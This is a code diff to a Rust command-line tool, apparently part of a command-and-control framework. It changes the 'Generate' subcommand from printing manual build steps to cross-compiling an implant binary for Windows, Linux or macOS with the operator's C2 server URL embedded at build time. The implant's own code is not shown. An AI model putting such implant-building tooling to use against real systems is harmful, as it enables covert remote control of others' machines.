@@ -113,33 +113,56 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
 
         Commands::Generate { os, c2, output, sleep } => {
+            use std::process::Command;
+
             println!("Generating implant for {}...", os);
             println!("C2 server: {}", c2);
             println!("Sleep interval: {}s", sleep);
 
-            // TODO: Actually cross-compile the implant with embedded config
-            // For now, just print instructions
-
-            let output_path = output.unwrap_or_else(|| {
-                match os.as_str() {
-                    "windows" => "implant.exe".to_string(),
-                    _ => "implant".to_string(),
+            let (target, binary_name) = match os.as_str() {
+                "windows" => ("x86_64-pc-windows-gnu", "remy-implant.exe"),
+                "linux" => ("x86_64-unknown-linux-gnu", "remy-implant"),
+                "macos" => ("x86_64-apple-darwin", "remy-implant"),
+                _ => {
+                    eprintln!("Unsupported OS: {}. Use: windows, linux, macos", os);
+                    std::process::exit(1);
                 }
-            });
+            };
 
-            println!();
-            println!("To build the implant manually:");
+            let output_path = output.unwrap_or_else(|| binary_name.to_string());
+
+            // Set C2 URL via environment variable (implant reads at compile time)
+            println!("Building with REMY_C2_URL={}", c2);
             println!();
 
-            if os == "windows" {
-                println!("  cargo build --release --bin remy-implant --target x86_64-pc-windows-gnu");
-            } else {
-                println!("  cargo build --release --bin remy-implant");
+            let status = Command::new("cargo")
+                .args(["build", "--release", "--bin", "remy-implant", "--target", target])
+                .env("REMY_C2_URL", &c2)
+                .status();
+
+            match status {
+                Ok(s) if s.success() => {
+                    // Copy to output path
+                    let built_path = format!("target/{}/release/{}", target, binary_name);
+                    if let Err(e) = std::fs::copy(&built_path, &output_path) {
+                        eprintln!("Failed to copy {} to {}: {}", built_path, output_path, e);
+                        eprintln!("Binary is at: {}", built_path);
+                    } else {
+                        println!("Implant generated: {}", output_path);
+                        println!("Size: {} bytes", std::fs::metadata(&output_path).map(|m| m.len()).unwrap_or(0));
+                    }
+                }
+                Ok(_) => {
+                    eprintln!("Build failed. Make sure you have the {} target installed:", target);
+                    eprintln!("  rustup target add {}", target);
+                    if os == "windows" {
+                        eprintln!("  # Also install mingw-w64 for Windows cross-compilation");
+                    }
+                }
+                Err(e) => {
+                    eprintln!("Failed to run cargo: {}", e);
+                }
             }
-
-            println!();
-            println!("Then edit src/implant/bin.rs to set C2_URL to: {}", c2);
-            println!("Output will be at: target/release/{}", output_path);
         }
 
         Commands::Demo { command } => {
